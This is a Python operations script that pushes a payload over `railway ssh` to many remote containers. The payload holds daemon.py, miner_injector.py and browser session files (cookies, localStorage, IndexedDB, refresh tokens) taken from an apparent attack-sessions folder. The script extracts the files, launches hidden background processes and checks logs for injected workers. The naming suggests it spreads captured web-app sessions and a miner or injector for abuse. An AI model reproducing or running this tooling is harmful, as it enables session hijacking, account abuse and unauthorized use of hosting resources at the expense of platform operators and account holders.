#!/usr/bin/env python3
"""Bootstrap cells from ops/assign_plan.json over flaky `railway ssh`.

Workarounds baked in (all verified 2026-09-25):
  * railway ssh drops the FIRST line of stdout -> every call starts with `echo`
  * huge single-line args get truncated   -> payload ships in ~3KB chunks
  * stdin is unreliable                  -> never used

Payload per cell = one base64(tar.gz) with daemon.py, miner_injector.py and
the Lovable trio. Usage: python3 ops/bootstrap_plan.py [cell ...]
"""
from __future__ import annotations

import base64
import io
import json
import os
import sys
import tarfile
import time
from pathlib import Path

sys.path.insert(0, "ops")
from cell_ops import ATK_SESSIONS, CHIM, LEAN_SUP, load_map, rw_home  # noqa
from ssh_reliable import ssh_checked  # noqa

CHUNK = 3000
TRIO_FILES = ("cookies.json", "localstorage.json", "indexeddb.json", "config.json")


def build_payload(lov: int) -> bytes:
    sess = ATK_SESSIONS / f"session-{lov}"
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name in ("daemon.py", "miner_injector.py"):
            data = (CHIM / name).read_bytes()
            ti = tarfile.TarInfo(name)
            ti.size = len(data)
            tf.addfile(ti, io.BytesIO(data))
        for name in TRIO_FILES:
            p = sess / name
            if not p.exists():
                continue
            data = p.read_bytes()
            ti = tarfile.TarInfo(f"trio/{name}")
            ti.size = len(data)
            tf.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


def run(home, svc, script: str, sentinel: str, tries: int = 3, timeout: int = 200):
    return ssh_checked(home, svc, script, sentinel, tries=tries, timeout=timeout)


def stage_blob(home, svc, blob_b64: str) -> bool:
    ok, _ = run(home, svc, "echo; rm -f /tmp/p.b64; echo RESET_OK", "RESET_OK", tries=2)
    if not ok:
        return False
    for i in range(0, len(blob_b64), CHUNK):
        piece = json.dumps(blob_b64[i:i + CHUNK])
        ok, out = run(home, svc, f"echo; printf %s {piece} >> /tmp/p.b64; echo APPENDED", "APPENDED", tries=3)
        if not ok:
            print("   append failed at", i, out[:80])
            return False
    return True


def extract(home, svc, lov: int, cell: int, proj: str) -> tuple[bool, str]:
    header = f"#!/bin/bash\nLOG=/app/work/daemon_r{cell}.log\nSESS=session-{lov}\nPROJ={proj}\nexport LOG SESS PROJ\n"
    lean = header + "\n".join(LEAN_SUP.splitlines()[1:]) + "\n"
    lean_b64 = base64.b64encode(lean.encode()).decode()
    script = f"""python3 - <<'PY'
import base64, io, os, pathlib, subprocess, tarfile, time

raw = pathlib.Path('/tmp/p.b64').read_text()
blob = base64.b64decode(raw)
tf = tarfile.open(fileobj=io.BytesIO(blob), mode='r:gz')
names = tf.getnames()
for base in ('/app/work', '/data/work'):
    d = pathlib.Path(base)
    d.mkdir(parents=True, exist_ok=True)
    cm = d / 'chimera-miner'
    cm.mkdir(parents=True, exist_ok=True)
    (d / 'scripts' / 'sessions' / 'session-{lov}').mkdir(parents=True, exist_ok=True)
    (d / 'shots').mkdir(parents=True, exist_ok=True)
    for m in tf.getmembers():
        if not m.isfile():
            continue
        if m.name.startswith('trio/'):
            out = d / 'scripts' / 'sessions' / 'session-{lov}' / m.name.split('/', 1)[1]
        else:
            out = cm / m.name
        out.write_bytes(tf.extractfile(m).read())
    (d / 'lean_sup.sh').write_bytes(base64.b64decode("{lean_b64}"))
    os.chmod(d / 'lean_sup.sh', 0o755)

idb = pathlib.Path('/app/work/scripts/sessions/session-{lov}/indexeddb.json')
rt = idb.exists() and ('refreshToken' in idb.read_text() or 'refresh_token' in idb.read_text())

def procs():
    o = []
    for p in os.listdir('/proc'):
        if not p.isdigit():
            continue
        try:
            o.append((p, open('/proc/'+p+'/cmdline','rb').read().replace(b'\\0',b' ').decode()))
        except Exception:
            pass
    return o

sup = [p for p, c in procs() if c.strip().endswith('/app/work/lean_sup.sh')]
if not sup:
    lg = pathlib.Path('/app/work/daemon_r{cell}.log')
    lg.parent.mkdir(parents=True, exist_ok=True)
    subprocess.Popen(['bash', '/app/work/lean_sup.sh'], stdout=open(lg, 'a'),
                     stderr=subprocess.STDOUT, start_new_session=True)
    time.sleep(6)
d = [p for p, c in procs() if c.startswith('/opt/venv/bin/python3 -u daemon.py')]
print("BOOTSTRAP_OK", "rt=%s" % rt, "files=%d" % len(names), "daemon=%d" % len(d))
PY"""
    return run(home, svc, script, "BOOTSTRAP_OK", tries=4, timeout=260)


def report(home, svc, cell: int) -> str:
    script = f"""python3 - <<'PY'
import os, pathlib
def procs():
    o = []
    for p in os.listdir('/proc'):
        if not p.isdigit():
            continue
        try:
            o.append((p, open('/proc/'+p+'/cmdline','rb').read().replace(b'\\0',b' ').decode()))
        except Exception:
            pass
    return o
pr = procs()
d = [p for p, c in pr if c.startswith('/opt/venv/bin/python3 -u daemon.py')]
x = [p for p, c in pr if 'Xvfb :99' in c and 'bash' not in c]
lp = pathlib.Path('/app/work/daemon_r{cell}.log')
txt = lp.read_bytes()[-9000:].decode('utf-8', 'replace') if lp.exists() else ''
inj = [l for l in txt.splitlines() if 'Worker injected' in l]
alive = [l for l in txt.splitlines() if 'Worker alive' in l]
print("STAT daemon=%d xvfb=%d logbytes=%d" % (len(d), len(x), lp.stat().st_size if lp.exists() else 0))
print("LAST_INJ", inj[-1].strip()[:50] if inj else '-')
print("LAST_ALIVE", alive[-1].strip()[:60] if alive else '-')
PY"""
    ok, out = run(home, svc, script, "STAT", tries=3)
    return " | ".join(l for l in out.splitlines() if l.startswith(("STAT", "LAST_INJ", "LAST_ALIVE")))


def do_cell(entry: dict, fmap: dict) -> str:
    cell, lov, proj = entry["cell"], entry["lov"], entry["project"]
    c = fmap["cells"][str(cell)]
    home = rw_home(int(c["railway_session"]))
    svc = c["service"]
    payload = build_payload(lov)
    blob = base64.b64encode(payload).decode()
    if not stage_blob(home, svc, blob):
        return f"cell-{cell} <- session-{lov}: STAGE FAIL ({len(blob)} b64)"
    ok, out = extract(home, svc, lov, cell, proj)
    if not ok:
        return f"cell-{cell} <- session-{lov}: EXTRACT FAIL ({out[:100]})"
    return f"cell-{cell} <- session-{lov}: {out.split('BOOTSTRAP_OK')[1].strip()[:60]} then {report(home, svc, cell)}"


def main() -> int:
    plan = json.loads(Path("ops/assign_plan.json").read_text())
    want = {int(x) for x in sys.argv[1:]} if len(sys.argv) > 1 else None
    fmap = load_map()
    for entry in plan:
        if want and entry["cell"] not in want:
            continue
        try:
            print(do_cell(entry, fmap), flush=True)
        except Exception as e:
            print(f"cell-{entry['cell']}: ERROR {type(e).__name__}: {e}", flush=True)
        time.sleep(3)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
